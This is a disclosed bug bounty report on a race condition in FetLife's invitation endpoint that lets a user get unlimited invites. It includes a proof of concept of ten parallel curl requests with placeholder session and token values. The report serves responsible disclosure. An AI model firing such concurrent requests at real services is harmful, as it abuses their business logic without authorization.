# Race condition in endpoint POST fetlife.com/users/invitation, allow attacker to generate unlimited invites

## Report Details
- **Report ID**: 1460373
- **URL**: https://hackerone.com/reports/1460373
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-26T04:33:55.120Z
- **Disclosed**: 2022-03-09T12:58:32.690Z

## Reporter
- **Username**: trieulieuf9
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: fetlife

## Vulnerability Information
This report describes the same bug as #1455487. I rewrite this bug here to make the report clearer. I will self-close #1455487 right now.

# Description

The `Invite Your Friend to Join FetLife` feature is vulnerable to race condition.

By sending many requests at the same time to endpoint `POST fetlife.com/users/invitation`. We are able to send many invites with the cost of 1 invite.

{F1592724}

Also, if we cancel sent-invite, we get back this invite. So basically, we can create unlimited invites by send many invites in race condition, then canceling them to get invites added back to our account.

{F1592733}

# Step to Reproduce

This is a chain of 10 curl commands in the form of `curl_command_1 & curl_command_2 & ... & curl_command_10`. It allows us to run 10 curl commands at the same time.

```
curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_8}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_9}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_10}'
```

1. Please inputs your `session_id` and `authenticity_token` in the above command, there are 10 places to input for each
2. Please uses 10 different emails for 10 curl commands above. such as, `example+1@gmail.com, example+2@gmail.com, ..., example+10@gmail.com`
3. Please url-encode your email addresses, so that: `example+1@gmail.com` becomes `example%2B1%40gmail.com`

## Impact

Attacker is able to generate unlimited amount of invites.

## Attachments
- example.png
- fetlife_hates_him.png
